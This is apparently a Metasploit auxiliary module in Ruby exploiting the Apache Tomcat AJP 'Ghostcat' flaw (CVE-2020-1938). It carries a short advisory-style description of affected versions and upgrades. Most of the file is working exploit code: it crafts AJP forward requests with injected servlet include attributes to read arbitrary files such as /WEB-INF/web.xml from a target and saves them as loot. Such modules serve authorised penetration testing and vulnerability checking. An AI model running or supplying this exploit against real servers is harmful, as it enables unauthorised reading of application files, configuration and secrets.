##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/apache_j_p'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  ApacheJP = Rex::Proto::ApacheJP

  GhostCatResponse = Struct.new(:status, :headers, :body)

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tomcat AJP File Read',
        'Description' => %q{
          When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache
          Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection.
          If such connections are available to an attacker, they can be exploited in ways that may be surprising.

          In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP
          Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended
          in the security guide) that this Connector would be disabled if not required. This vulnerability report
          identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application -
          processing any file in the web application as a JSP. Further, if the web application allowed file upload
          and stored those files within the web application (or the attacker was able to control the content of the
          web application by some other means) then this, along with the ability to process a file as a JSP, made
          remote code execution possible.

          It is important to note that mitigation is only required if an AJP port is accessible to untrusted users.
          Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files
          and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were
          made to the default AJP Connector configuration in 9.0.31 to harden the default configuration.
          It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes
          to their configurations.
        },
        'Author' => [
          'A Security Researcher of Chaitin Tech', # POC
          'SunCSR Team' # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-1938'],
          ['EDB', '48143'],
          ['URL', 'http://web.archive.org/web/20250114042903/https://www.chaitin.cn/en/ghostcat']
        ],
        'DisclosureDate' => '2020-02-20',
        'Notes' => {
          'AKA' => ['Ghostcat'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8009, true, 'The Apache JServ Protocol (AJP) port'),
        OptString.new('FILENAME', [true, 'File name', '/WEB-INF/web.xml'])
      ]
    )
  end

  def send_recv_once(data)
    buf = ''
    begin
      connect
      sock.put(data)
      buf = sock.get(30) || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog('Error socket', error: e)
    ensure
      disconnect
    end
    buf
  end

  def parse_response(buf)
    parsed_response = GhostCatResponse.new

    until buf.empty?
      chunk = buf[4...(4 + buf.unpack1('xxn'))]
      buf = buf[(4 + chunk.length)...]

      case chunk[0].ord
      when ApacheJP::ApacheJPSendBodyChunk::PREFIX_CODE
        send_body_chunk = ApacheJP::ApacheJPSendBodyChunk.read(chunk)
        parsed_response.body = send_body_chunk.body_chunk.to_s
      when ApacheJP::ApacheJPSendHeaders::PREFIX_CODE
        send_headers = ApacheJP::ApacheJPSendHeaders.read(chunk)
        parsed_response.status = send_headers.http_status_code.to_i
        parsed_response.headers = send_headers.headers.snapshot.map { |header| [header.header_name.to_s, header.header_value.to_s] }.to_h
      when ApacheJP::ApacheJPEndResponse::PREFIX_CODE
        break
      when ApacheJP::ApacheJPGetBodyChunk::PREFIX_CODE
        next # no need to process this chunk
      else
        fail_with(Failure::UnexpectedReply, "Received unknown AJP prefix code: #{chunk[0].ord}")
      end
    end

    parsed_response
  end

  def read_success?(ghost_cat_response)
    ghost_cat_response.status == 200
  end

  def read_remote_file
    ajp_forward_request = ApacheJP::ApacheJPForwardRequest.new(
      http_method: ApacheJP::ApacheJPForwardRequest::HTTP_METHOD_GET,
      req_uri: '/index.txt',
      remote_addr: '127.0.0.1',
      remote_host: 'localhost',
      server_name: datastore['RHOST'].to_s,
      headers: [
        { header_name: 'host', header_value: "#{datastore['RHOST']}:8080" }
      ],
      attributes: [
        {
          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,
          attribute_name: 'javax.servlet.include.request_uri',
          attribute_value: 'index'
        },
        {
          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,
          attribute_name: 'javax.servlet.include.path_info',
          attribute_value: datastore['FILENAME'].to_s
        },
        {
          code: ApacheJP::ApacheJPRequestAttribute::CODE_REQ_ATTRIBUTE,
          attribute_name: 'javax.servlet.include.servlet_path',
          attribute_value: '/'
        },
        { code: ApacheJP::ApacheJPRequestAttribute::CODE_TERMINATOR }
      ]
    )

    data = "\x12\x34" + [ ajp_forward_request.num_bytes ].pack('n') + ajp_forward_request.to_binary_s
    parse_response(send_recv_once(data))
  end

  def check
    ghost_cat_response = read_remote_file
    if read_success?(ghost_cat_response)
      return Exploit::CheckCode::Appears("Successfully read file #{datastore['FILENAME']}")
    end

    Exploit::CheckCode::Safe
  rescue StandardError => e
    Exploit::CheckCode::Unknown(e.message)
  end

  def run
    ghost_cat_response = read_remote_file
    print ghost_cat_response.body unless ghost_cat_response.body.blank?

    unless read_success?(ghost_cat_response)
      print_error 'Unable to read file, target may not be vulnerable.'
    end

    file = store_loot(
      datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,
      ghost_cat_response.body, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']
    )
    print_good "File contents save to: #{file}"
  end
end
